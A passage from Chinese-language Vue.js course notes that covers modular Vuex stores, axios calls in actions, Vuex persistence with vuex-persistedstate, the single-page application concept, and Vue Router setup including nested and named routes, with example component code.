<font style="color:#595959;">            this.$store.dispatch('school/schNumFun')</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        schNameFun() {</font>

<font style="color:#595959;">            // 直接commit</font>

<font style="color:#595959;">            this.$store.commit('school/SCH_NAME_FUN')</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>



<font style="color:#595959;"><style></style></font>

### 5.9.2 使用mapXxxx的模块化开发 
store.js 分为如果个js模块，再将各模块分别导入，写法一致，不一样的是数据的拿取于触发

student.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div></font>

<font style="color:#595959;">        <h1>student</h1></font>

<font style="color:#595959;">        <h2>studentNum：{{ studentNum }}</h2></font>

<font style="color:#595959;">        <h3>reverseStudentName:{{ reverseStudentName }}</h3></font>

<font style="color:#595959;">        <button @click="stuNumFun">stuNum++</button></font>

<font style="color:#595959;">        <button @click="stuNameFun">stuName+@</button></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">import { mapState, mapGetters, mapActions, mapMutations } from 'vuex'</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'student',</font>

<font style="color:#595959;">    mounted() {</font>

<font style="color:#595959;">        console.log(this.$store);</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    computed: {</font>

<font style="color:#595959;">        // map模块化获取数据</font>

<font style="color:#595959;">        ...mapState('student', ['studentNum']),</font>

<font style="color:#595959;">        ...mapGetters('student', ['reverseStudentName'])</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">        // 对象形式</font>

<font style="color:#595959;">        ...mapActions('student', { stuNumFun: 'stuNumFun' }),</font>

<font style="color:#595959;">        // stuNumFun() {</font>

<font style="color:#595959;">        //     this.$store.dispatch('student/stuNumFun')</font>

<font style="color:#595959;">        // },</font>

<font style="color:#595959;">        ...mapMutations('student', { stuNameFun: 'STU_NAME_FUN' })</font>

<font style="color:#595959;">        // stuNameFun() {</font>

<font style="color:#595959;">        //     this.$store.commit('student/STU_NAME_FUN')</font>

<font style="color:#595959;">        // }</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>



<font style="color:#595959;"><style></style></font>

school.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div></font>

<font style="color:#595959;">        <h1>school</h1></font>

<font style="color:#595959;">        <h2>schoolNum：{{ schoolNum }}</h2></font>

<font style="color:#595959;">        <h2>reverseSchoolName:{{ reverseSchoolName }}</h2></font>

<font style="color:#595959;">        <button @click="schNumFun">schNum++</button></font>

<font style="color:#595959;">        <button @click="SCH_NAME_FUN">schName+@</button></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">import { mapState, mapGetters, mapActions, mapMutations } from 'vuex'</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'school',</font>

<font style="color:#595959;">    computed: {</font>

<font style="color:#595959;">        ...mapState('school', ['schoolNum']),</font>

<font style="color:#595959;">        ...mapGetters('school', ['reverseSchoolName'])</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">        // 数组形式</font>

<font style="color:#595959;">        ...mapActions('school', ['schNumFun']),</font>

<font style="color:#595959;">        // schNumFun() {</font>

<font style="color:#595959;">        //     this.$store.dispatch('school/schNumFun')</font>

<font style="color:#595959;">        // },</font>

<font style="color:#595959;">        ...mapMutations('school', ['SCH_NAME_FUN'])</font>

<font style="color:#595959;">        // schNameFun() {</font>

<font style="color:#595959;">        //     // 直接commit</font>

<font style="color:#595959;">        //     this.$store.commit('school/SCH_NAME_FUN')</font>

<font style="color:#595959;">        // }</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>



<font style="color:#595959;"><style></style></font>

### 5.9.3 action中发送ajax
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433661821-17040201-f5fb-4188-9e4b-cbe7a6d4eaea.png)

test.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div></font>

<font style="color:#595959;">        <h2>test</h2></font>

<font style="color:#595959;">        <button @click="getUserInfo">发送数据，并展示</button></font>

<font style="color:#595959;">        <ul></font>

<font style="color:#595959;">            <li v-for="(item, index) in list" :key="index">{{ item.name }}</li></font>

<font style="color:#595959;">        </ul></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">import { mapState, mapActions } from 'vuex';</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'test',</font>

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">        ...mapActions('test', ['getUserInfo'])</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    computed: {</font>

<font style="color:#595959;">        ...mapState('test', ['list'])</font>

<font style="color:#595959;">    }</font>



<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

store.js

<font style="color:#595959;">import Vue from "vue";</font>

<font style="color:#595959;">import Vuex from "vuex";</font>

<font style="color:#595959;">Vue.use(Vuex);</font>



<font style="color:#595959;">// 导入各vuex模块</font>

<font style="color:#595959;">import student from "./student";</font>

<font style="color:#595959;">import school from "./school";</font>

<font style="color:#595959;">import test from "./test";</font>



<font style="color:#595959;">export default new Vuex.Store({</font>

<font style="color:#595959;">  modules: {</font>

<font style="color:#595959;">    student,</font>

<font style="color:#595959;">    school,</font>

<font style="color:#595959;">    test,</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">});</font>

test.js

<font style="color:#595959;">import axios from "axios";</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  namespaced: true,</font>

<font style="color:#595959;">  actions: {</font>

<font style="color:#595959;">    // 请求数据</font>

<font style="color:#595959;">    async getUserInfo(context) {</font>

<font style="color:#595959;">      try {</font>

<font style="color:#595959;">        let res = await axios.get("api/user");</font>

<font style="color:#595959;">        context.commit("GET_USER_INFO", res.data);</font>

<font style="color:#595959;">        // console.log(res.data);</font>

<font style="color:#595959;">      } catch (error) {</font>

<font style="color:#595959;">        console.log(error.message);</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  getters: {},</font>

<font style="color:#595959;">  mutations: {</font>

<font style="color:#595959;">    // 更新state数据</font>

<font style="color:#595959;">    GET_USER_INFO(state, value) {</font>

<font style="color:#595959;">      state.list = value;</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  state: {</font>

<font style="color:#595959;">    list: [],</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">};</font>

## 5.10、vuex持久化
做Vue项目中的登录模块，登陆成功后获取到token，将token存储在vuex中，然而我发现切换刷新页面后vuex中的数据都恢复默认了。而后面进行鉴权处理需要token，于是我们要将vuex中的数据进行本地存储。

这里就用到了vuex持久化插件vuex-persistedstate

<font style="color:#4D4D4D;">第一步、安装：</font>

<font style="color:#595959;">npm install vuex-persistedstate --save</font>

第二步：<font style="color:#4D4D4D;">在store下的index.js中引入配置</font>

<font style="color:#595959;">import { createStore } from 'vuex'</font>

<font style="color:#595959;">import createPersistedState from 'vuex-persistedstate'</font>



<font style="color:#595959;">export default createStore({  </font>

<font style="color:#595959;">    state: {  },  </font>

<font style="color:#595959;">    mutations: {  },  </font>

<font style="color:#595959;">    actions: {  },  </font>

<font style="color:#595959;">    modules: {  },  </font>

<font style="color:#595959;">    plugins: [    </font>

<font style="color:#595959;">        createPersistedState(),  </font>

<font style="color:#595959;">    ],</font>

<font style="color:#595959;">})</font>

<font style="color:#4D4D4D;">这样是默认存储到localStorage，如果想要存储到sessionStorage，配置如下</font>

<font style="color:#595959;">import { createStore } from 'vuex'</font>

<font style="color:#595959;">import createPersistedState from 'vuex-persistedstate'</font>

<font style="color:#595959;">export default createStore({  </font>

<font style="color:#595959;">    state: {  },  </font>

<font style="color:#595959;">    mutations: {  },  </font>

<font style="color:#595959;">    actions: {  },  </font>

<font style="color:#595959;">    modules: {  },  </font>

<font style="color:#595959;">    plugins: [    </font>

<font style="color:#595959;">        // 把vuex的数据存储到sessionStorage    </font>

<font style="color:#595959;">        createPersistedState({      </font>

<font style="color:#595959;">            storage: window.sessionStorage,    </font>

<font style="color:#595959;">        }),  </font>

<font style="color:#595959;">    ],</font>

<font style="color:#595959;">})</font>

<font style="color:#4D4D4D;">默认持久化所有的state，如果想要存储指定的state，配置如下</font>

<font style="color:#595959;">import { createStore } from 'vuex'</font>

<font style="color:#595959;">import createPersistedState from 'vuex-persistedstate'</font>

<font style="color:#595959;">export default createStore({  </font>

<font style="color:#595959;">    state: {  },  </font>

<font style="color:#595959;">    mutations: {  },  </font>

<font style="color:#595959;">    actions: {  },  </font>

<font style="color:#595959;">    modules: {  },  </font>

<font style="color:#595959;">    plugins: [    </font>

<font style="color:#595959;">        // 把vuex的数据存储到sessionStorage    </font>

<font style="color:#595959;">        createPersistedState({      </font>

<font style="color:#595959;">            storage: window.sessionStorage,      </font>

<font style="color:#595959;">            reducer(val) {        </font>

<font style="color:#595959;">                return {          </font>

<font style="color:#595959;">                    // 只存储state中的userData          </font>

<font style="color:#595959;">                    userData: val.userData        </font>

<font style="color:#595959;">                }      </font>

<font style="color:#595959;">            }    </font>

<font style="color:#595959;">        }),  </font>

<font style="color:#595959;">    ],</font>

<font style="color:#595959;">})</font>

其他API：

key: 存储持久状态的key（默认vuex）

paths ：部分持续状态的任何路径的数组。如果没有路径给出，完整的状态是持久的。（默认：[]）

reducer ：一个函数，将被调用来基于给定的路径持久化的状态。默认包含这些值。

subscriber ：一个被调用来设置突变订阅的函数。默认为store => handler => store.subscribe(handler)

storage ：而不是（或与）getState和setState。默认为localStorage。

getState ：将被调用以重新水化先前持久状态的函数。默认使用storage。

setState ：将被调用来保持给定状态的函数。默认使用storage。

filter ：将被调用来过滤将setState最终触发存储的任何突变的函数。默认为() => true





**《06.route》**

## 6.1 传统web应用vs单页面web应用
### 6.1.1、传统web应用
传统web应用，又叫做多页面web应用：核心是一个web站点由多个HTML页面组成，点击时完成页面的切换，因为是切换到新的HTML页面上，所以当前页面会全部刷新。

### 6.1.2、单页面web应用（SPA：<font style="color:#FF0000;">S</font>ingle <font style="color:#FF0000;">P</font>age web <font style="color:#FF0000;">A</font>pplication）
整个网站<u>只有一个HTML页面</u>，点击时只是完成当前页面中<font style="color:#DF2A3F;">组件的切换</font>。属于<u>页面局部刷新</u>。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433662165-97572d8a-2d38-44ad-8550-3cb7f327f075.png)

单页应用程序 (SPA) 是加载单个HTML 页面并在用户与应用程序交互时动态更新该页面的Web应用程序。浏览器一开始会加载必需的HTML、CSS和JavaScript，所有的操作都在这张页面上完成，都由JavaScript来控制。单页面的跳转<font style="color:#FF0000;">仅刷新局部资源</font>。因此，对单页应用来说<font style="color:#FF0000;">模块化的开发和设计</font>显得相当重要。

### 6.1.3、单页面应用的优缺点：
#### 6.1.3.1、单页面应用的优点
1、提供了更加<u>吸引人的用户体验</u>：具有桌面应用的即时性、网站的可移植性和可访问性。

2、单页应用的<u>内容的改变不需要重新加载整个页面</u>，web应用更具响应性和更令人着迷。

3、单页应用没有页面之间的切换，就<u>不会出现“白屏现象”</u>,也不会出现假死并有“闪烁”现象

4、单页应用相对<u>服务器压力小</u>，服务器只用出数据就可以，不用管展示逻辑和页面合成，吞吐能力会提高几倍。

5、<u>良好的前后端分离。</u>后端不再负责模板渲染、输出页面工作，后端API通用化，即同一套后端程序代码，不用修改就可以用于Web界面、手机、平板等多种客户端

#### 6.1.3.2、单页面应用的缺点：
1、<u>首次加载耗时比较多</u>。

2、<u>SEO问题</u>，不利于百度，360等搜索引擎收录。

3、容易造成<u>CSS命名冲突</u>。

4、前进、后退、地址栏、书签等，都需要程序进行管理，<u>页面的复杂度很高，需要一定的技能水平和开发成本高。</u>

6.1.3.3、单页面和多页面的对比

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433662428-97cee579-3998-40d0-a351-10e7899ca389.png)

目前较为流行的是单页面应用的开发。

如果想使用Vue去完成单页面应用的开发，需要借助Vue当中的<font style="color:#DF2A3F;">路由机制</font>。

## 6.2 路由route与路由器router 
1、路由：route 

2、路由器：router

路由器用来管理/调度各个路由

对于一个应用来说，一般路由器只需要一个，但是路由是有多个的

3、<font style="color:#DF2A3F;">每一个路由都由key和value组成</font>。

key是路径，value是对应的组件

key1+value1===>路由route1

key2+value2===>路由route2

key3+value3===>路由route3

......

4、路由的本质：<font style="color:#FF0000;">一个路由表达了一组对应关系</font>。

5、路由器的本质：<font style="color:#FF0000;">管理多组对应关系</font>。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433662761-282ae44b-fd9a-4563-96bb-7b6e9f7b3e84.png)

## 6.3 使用路由 
### 6.3.1、创建组件
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433663061-e2f4f877-c7cc-49b8-b6c1-41b6a3d8e2e7.png)

app.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div class="app"></font>

<font style="color:#595959;">    <MyHeader class="myheader" title="首页" /></font>

<font style="color:#595959;">    <Home class="mycontent" /></font>

<font style="color:#595959;">    <Myfooter class="myfooter" /></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">import MyHeader from './components/MyHeader.vue'</font>

<font style="color:#595959;">import Myfooter from './components/Myfooter.vue';</font>

<font style="color:#595959;">import Home from './components/home.vue';</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  name: 'App',</font>

<font style="color:#595959;">  components: {</font>

<font style="color:#595959;">    MyHeader,</font>

<font style="color:#595959;">    Myfooter,</font>

<font style="color:#595959;">    Home</font>

<font style="color:#595959;">  }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>



<font style="color:#595959;"><style></font>

<font style="color:#595959;">* {</font>

<font style="color:#595959;">  margin: 0;</font>

<font style="color:#595959;">  padding: 0;</font>

<font style="color:#595959;">}</font>



<font style="color:#595959;">.app {</font>

<font style="color:#595959;">  width: 375px;</font>

<font style="color:#595959;">  height: 667px;</font>

<font style="color:#595959;">  display: flex;</font>

<font style="color:#595959;">  flex-direction: column;</font>

<font style="color:#595959;">  margin: 30px auto;</font>

<font style="color:#595959;">}</font>



<font style="color:#595959;">.myheader,</font>

<font style="color:#595959;">.myfooter {</font>

<font style="color:#595959;">  width: 100%;</font>

<font style="color:#595959;">  line-height: 50px;</font>

<font style="color:#595959;">  background-color: gainsboro;</font>

<font style="color:#595959;">  display: flex;</font>

<font style="color:#595959;">  align-items: center;</font>

<font style="color:#595959;">}</font>



<font style="color:#595959;">.myheader {</font>

<font style="color:#595959;">  justify-content: space-between;</font>

<font style="color:#595959;">}</font>



<font style="color:#595959;">.myfooter {</font>

<font style="color:#595959;">  justify-content: space-around;</font>

<font style="color:#595959;">}</font>



<font style="color:#595959;">.mycontent {</font>

<font style="color:#595959;">  width: 100%;</font>

<font style="color:#595959;">  flex-grow: 1;</font>

<font style="color:#595959;">  background-color: pink;</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></style></font>

MyHeader.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div class="myheader"></font>

<font style="color:#595959;">    <button>返回</button></font>

<font style="color:#595959;">    <h3>{{ title }}</h3></font>

<font style="color:#595959;">    <button>详情</button></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name:'MyHeader',</font>

<font style="color:#595959;">    props:['title']</font>



<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>



<font style="color:#595959;"><style scoped></font>

<font style="color:#595959;">button{</font>

<font style="color:#595959;">    width: 70px;</font>

<font style="color:#595959;">    height: 40px;</font>

<font style="color:#595959;">}</font>



<font style="color:#595959;"></style></font>

MyFooter.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div></font>

<font style="color:#595959;">    <a href="#" v-for="nav in navList" :key="nav">{{ nav }}</a></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  name: 'MyFooter',</font>

<font style="color:#595959;">  data() {</font>

<font style="color:#595959;">    return {</font>

<font style="color:#595959;">      navList: ['首页', '新闻', '购物车', '我的']</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">  },</font>



<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>



<font style="color:#595959;"><style></style></font>

Home.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div></font>

<font style="color:#595959;">    home</font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">   </font>

<font style="color:#595959;">    name:''</font>



<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>



<font style="color:#595959;"><style></font>



<font style="color:#595959;"></style></font>







### 6.3.2、安装路由vue-router
<font style="color:#FF0000;">(1) vue2 要安装 vue-router3</font>

<font style="color:#FF0000;">① npm i </font>[vue-router@3](http://vue-router@3" \t "_blank)

(2) vu3要安装vue-router4

① npm i [vue-router@4](http://vue-router@4" \t "_blank)

如果报错

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433663330-f8113819-0a5d-42a7-9aaa-7ba8c722f346.png)

npm i [vue-router@3](http://vue-router@3" \t "_blank) --legacy-peer-deps

### 6.3.3、配置vue-router环境并使用
main.js

<font style="color:#595959;">import Vue from "vue";</font>

<font style="color:#595959;">import App from "./App.vue";</font>





<font style="color:#595959;">Vue.config.productionTip = false;</font>

<font style="color:#595959;">// 导入路由器对象</font>

<font style="color:#595959;">import router from "./router";</font>



<font style="color:#595959;">const vm = new Vue({</font>

<font style="color:#595959;">  render: (h) => h(App),</font>

<font style="color:#595959;">  // 一旦使用了vue-router插件，那么new Vue的时候就可以直接传递一个配置项</font>

<font style="color:#595959;">  // 注册路由器对象，router</font>

<font style="color:#595959;">  router</font>

<font style="color:#595959;">}).$mount("#app");</font>

<font style="color:#595959;">console.log(vm);</font>

在src目录下，新建一个router文件夹，新建index.js,配置路由器对象，并暴露

第一步:配置路由关系

<font style="color:#595959;">// 导入Vue</font>

<font style="color:#595959;">import Vue from "vue";</font>

<font style="color:#595959;">// 导入VueRouter</font>

<font style="color:#595959;">import VueRouter from "vue-router";</font>

<font style="color:#595959;">// 注册VueRouter</font>

<font style="color:#595959;">Vue.use(VueRouter)</font>



<font style="color:#595959;">// 导入路由组件</font>

<font style="color:#595959;">import Home from "@/views/home.vue";</font>

<font style="color:#595959;">import News from "@/views/news.vue";</font>

<font style="color:#595959;">import Car from "@/views/car.vue";</font>

<font style="color:#595959;">import My from "@/views/my.vue";</font>



<font style="color:#595959;">const router=new VueRouter({</font>

<font style="color:#595959;">    // routes 配置路由规则，配置一组组路由关系,数组</font>

<font style="color:#595959;">    // 每一组路由关系都是一个对象：</font>

<font style="color:#595959;">    // key：路径==>path</font>

<font style="color:#595959;">    // value：组件==>component</font>

<font style="color:#595959;">    routes:[</font>

<font style="color:#595959;">        {</font>

<font style="color:#595959;">            path:'/home',//注意要以/开头</font>

<font style="color:#595959;">            component:Home</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        {</font>

<font style="color:#595959;">            path:'/news',</font>

<font style="color:#595959;">            component:News</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        {</font>

<font style="color:#595959;">            path:'/car',</font>

<font style="color:#595959;">            component:Car</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        {</font>

<font style="color:#595959;">            path:'/mine',</font>

<font style="color:#595959;">            // 路径要以/开头,路径名与文件名可以不一样</font>

<font style="color:#595959;">            // 这里的路径名是mine，但是文件名是my.vue</font>

<font style="color:#595959;">            // 路径是用来跳转URL</font>

<font style="color:#595959;">            component:My</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">    ]</font>



<font style="color:#595959;">})</font>



<font style="color:#595959;">export default router</font>

第二步：使用路由关系

MyFooter.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div></font>

<font style="color:#595959;">    <!-- 第二步：routerlink的to属性，配置好路由关系 --></font>

<font style="color:#595959;">    <!-- to 配置路由路径 ，点击时会跳到对应路径的路由组件--></font>

<font style="color:#595959;">    <router-link :to="nav.path" v-for="nav in navList" :key="nav.name">{{ nav.name }}</router-link></font>

<font style="color:#595959;">    <!-- <a href="#" >{{ nav }}</a> --></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  name: 'MyFooter',</font>

<font style="color:#595959;">  data() {</font>

<font style="color:#595959;">    return {</font>

<font style="color:#595959;">      navList: [</font>

<font style="color:#595959;">        {</font>

<font style="color:#595959;">          name: '首页',</font>

<font style="color:#595959;">          path: '/home',</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        {</font>

<font style="color:#595959;">          name: '新闻',</font>

<font style="color:#595959;">          path: '/news',</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        {</font>

<font style="color:#595959;">          name: '购物车',</font>

<font style="color:#595959;">          path: '/car',</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        {</font>

<font style="color:#595959;">          name: '我的',</font>

<font style="color:#595959;">          path: '/mine',</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      ]</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">  },</font>



<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>



<font style="color:#595959;"><style></style></font>

第三步：路由组件显示

app.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div class="app"></font>

<font style="color:#595959;">    <MyHeader class="myheader" title="首页" /></font>

<font style="color:#595959;">    <!-- <Home class="mycontent" /> --></font>

<font style="color:#595959;">     <!-- 第三步：告诉路由器，路由组件显示的位置 --></font>

<font style="color:#595959;">    <div class="mycontent"></font>

<font style="color:#595959;">      <!-- 告诉路由器，路由组件显示在这个位置 --></font>

<font style="color:#595959;">      <router-view /></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;">    <Myfooter class="myfooter" /></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>

注意事项：

① 路由组件一般会和普通组件分开存放，路由组件放到pages或views目录，普通组件放到components目录下。

②<font style="color:#DF2A3F;"> </font><u><font style="color:#DF2A3F;">路由组件在进行切换的时候，切掉的组件会被销毁，</font></u>可用destroyed生命周期钩子证实

③ 路由组件的两个属性：$route和$router

1)<u> $route：属于自己的路由对象。</u>

<u>2) $router：多组件共享的路由器对象。</u>

### 6.3.4、小功能：
点击底部导航，顶部title部分随着进行更新，这里用到了兄弟传参，还要在本地保存一份，解决刷新，title初始化的问题，

注意：router-link上不能绑定点击事件，不生效

myfooter.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div></font>

<font style="color:#595959;">    <!-- 第二步：routerlink的to属性，配置好路由关系 --></font>

<font style="color:#595959;">    <!-- to 配置路由路径 ，点击时会跳到对应路径的路由组件--></font>

<font style="color:#595959;">    <router-link :to="nav.path" v-for="nav in navList" :key="nav.name" active-class="active"></font>

<font style="color:#595959;">      <span @click="sendTilte(nav.name)"></font>

<font style="color:#595959;">        {{ nav.name }}</font>

<font style="color:#595959;">      </span></font>

<font style="color:#595959;">    </router-link></font>

<font style="color:#595959;">    <!-- <a href="#" >{{ nav }}</a> --></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  name: 'MyFooter',</font>

<font style="color:#595959;">  data() {</font>

<font style="color:#595959;">    return {</font>

<font style="color:#595959;">      navList: [</font>

<font style="color:#595959;">       //·····</font>

<font style="color:#595959;">      ]</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  methods: {</font>

<font style="color:#595959;">    sendTilte(name) {</font>

<font style="color:#595959;">      this.$bus.$emit('handlerSendTilte', name)</font>

<font style="color:#595959;">      localStorage.setItem('title',name)</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">  }</font>



<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

myheader.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div class="myheader"></font>

<font style="color:#595959;">    <button>返回</button></font>

<font style="color:#595959;">    <h3>{{ title }}</h3></font>

<font style="color:#595959;">    <button>详情</button></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  name: 'MyHeader',</font>

<font style="color:#595959;">  data() {</font>

<font style="color:#595959;">    return {</font>

<font style="color:#595959;">      // 初始化数据从本地拿取</font>

<font style="color:#595959;">      title: localStorage.getItem('title')||'首页'</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  mounted() {</font>

<font style="color:#595959;">    this.$bus.$on('handlerSendTilte', (name) => {</font>

<font style="color:#595959;">      this.title = name</font>

<font style="color:#595959;">    })</font>

<font style="color:#595959;">  }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

## 6.4 多级路由
第一步：创建好二级路由组件

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433663560-81717e84-d63c-4975-8594-60e283c143eb.png)

第二步：router/index.js配置好二级路由关系

<font style="color:#595959;">//....</font>

<font style="color:#595959;">        import Hot from "@/views/home/hot.vue";</font>

<font style="color:#595959;">        import Agree from "@/views/home/agree.vue";</font>

<font style="color:#595959;">        import More from "@/views/home/more.vue";</font>



<font style="color:#595959;">        const router = new VueRouter({</font>

<font style="color:#595959;">        // 配置路由规则  配置一组组路由关系，</font>

<font style="color:#595959;">        // 每一组路由关系都是一个对象：</font>

<font style="color:#595959;">        // key：路径==>path</font>

<font style="color:#595959;">        // value：组件==>component</font>

<font style="color:#595959;">        // 第一步：配置好路由关系：key--value</font>

<font style="color:#595959;">        routes: [</font>

<font style="color:#595959;">        {</font>

<font style="color:#595959;">        path: '/home',//注意要以/开头</font>

<font style="color:#595959;">        component: Home,</font>

<font style="color:#595959;">        // children配置项，配置二级路由</font>

<font style="color:#595959;">        children: [</font>

<font style="color:#595959;">        {</font>

<font style="color:#595959;">        // path写法一:路径完整</font>

<font style="color:#595959;">        // path:'/home/hot',//二级路由路径</font>

<font style="color:#595959;">        // path写法二：直接写路径名，不能加/</font>

<font style="color:#595959;">        path: 'hot',</font>

<font style="color:#595959;">        component: Hot//二级路由</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        {</font>

<font style="color:#595959;">        path: 'agree',</font>

<font style="color:#595959;">        component: Agree</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        {</font>

<font style="color:#595959;">        path: 'more',</font>

<font style="color:#595959;">        component: More</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">        ]</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        //·····</font>

第三步：routerLink使用

src/views/home/index.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div></font>

<font style="color:#595959;">    <!-- 轮播图 --></font>

<font style="color:#595959;">    <div class="swiper">轮播图</div></font>

<font style="color:#595959;">    <!-- 二级导航 --></font>

<font style="color:#595959;">    <div class="subNav"></font>

<font style="color:#595959;">      <!-- 二级路由在使用时，必须把路径写完整 --></font>

<font style="color:#595959;">      <router-link to="/home/hot"></font>

<font style="color:#595959;">        <h5>正在热卖</h5></font>

<font style="color:#595959;">      </router-link></font>

<font style="color:#595959;">      <router-link to="/home/agree"></font>

<font style="color:#595959;">        <h5>值得推荐</h5></font>

<font style="color:#595959;">      </router-link></font>

<font style="color:#595959;">      <router-link to="/home/more"></font>

<font style="color:#595959;">        <h5>查看更多</h5></font>

<font style="color:#595959;">      </router-link></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    //·····</font>

第四步：设置二级路由显示位置

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div></font>

<font style="color:#595959;">    <!-- 轮播图 --></font>

<font style="color:#595959;">    <div class="swiper">轮播图</div></font>

<font style="color:#595959;">    <!-- 二级导航 --></font>

<font style="color:#595959;">    <div class="subNav"></font>

<font style="color:#595959;">      //·····</font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <!-- 路由组件显示位置 --></font>

<font style="color:#595959;">     <div></font>

<font style="color:#595959;">      <router-view /></font>

<font style="color:#595959;">     </div></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>

## 6.5 路由起名字 
<u>可以给路由起一个名字，这样可以简化to的编写</u>，且后期我们在parms传参，需要用到name

第一步：在路由关系中，添加name的配置

<font style="color:#595959;"> {</font>

<font style="color:#595959;">      path: 'agree',</font>

<font style="color:#595959;">      component: Agree,</font>

<font style="color:#595959;">      name: 'agree'</font>

